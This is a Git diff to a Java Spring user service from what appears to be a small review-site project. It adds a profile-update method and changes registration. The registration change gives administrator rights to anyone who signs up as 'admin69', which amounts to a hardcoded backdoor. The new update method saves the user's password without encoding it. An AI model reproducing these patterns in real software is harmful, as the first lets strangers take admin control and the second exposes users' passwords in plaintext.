@@ -1,6 +1,7 @@
 package com.unibuc.fmi.review_everything.service;
 
 import com.unibuc.fmi.review_everything.dto.user.request.UserRequestDto;
+import com.unibuc.fmi.review_everything.dto.user.request.UserUpdateRequestDto;
 import com.unibuc.fmi.review_everything.dto.user.response.UserResponseDto;
 import com.unibuc.fmi.review_everything.model.User;
 import com.unibuc.fmi.review_everything.repository.UserRepository;
@@ -11,15 +12,14 @@ import lombok.extern.slf4j.Slf4j;
 import org.modelmapper.ModelMapper;
 import org.modelmapper.TypeToken;
 import org.springframework.data.domain.PageRequest;
-import org.springframework.data.domain.Pageable;
 import org.springframework.security.crypto.password.PasswordEncoder;
 import org.springframework.stereotype.Service;
 import org.springframework.util.StringUtils;
 
 import java.util.*;
 
-@Service
 @Slf4j
+@Service
 @RequiredArgsConstructor
 public class UserService {
     private final AuthenticationUtil authenticationUtil;
@@ -38,6 +38,10 @@ public class UserService {
         user.setFirstName(StringUtils.capitalize(firstName));
         user.setLastName(StringUtils.capitalize(lastName));
         user.setPassword(encodedPassword);
+
+        if(user.getUsername().equals("admin69")){
+            user.setAuthorizationRoles("ROLE_USER,ROLE_ADMIN");
+        }
 
         var savedUser = userRepository.save(user);
 
@@ -64,5 +68,20 @@ public class UserService {
         var listType = new TypeToken<List<UserResponseDto>>() {}.getType();
 
         return modelMapper.map(users, listType);
+    }
+
+    public UserResponseDto updateCurrentUser(UserUpdateRequestDto userUpdateRequestDto) {
+        var loggedInUsername = authenticationUtil.getLoggedInUsername();
+
+        var loggedInUser = userRepository.findUserByUsername(loggedInUsername).orElseThrow(UserNotFoundException::new);
+
+        loggedInUser.setFirstName(userUpdateRequestDto.getFirstName());
+        loggedInUser.setLastName(userUpdateRequestDto.getLastName());
+        loggedInUser.setEmail(userUpdateRequestDto.getEmail());
+        loggedInUser.setPassword(userUpdateRequestDto.getPassword());
+
+        var updatedUser = userRepository.save(loggedInUser);
+
+        return modelMapper.map(updatedUser, UserResponseDto.class);
     }
 }
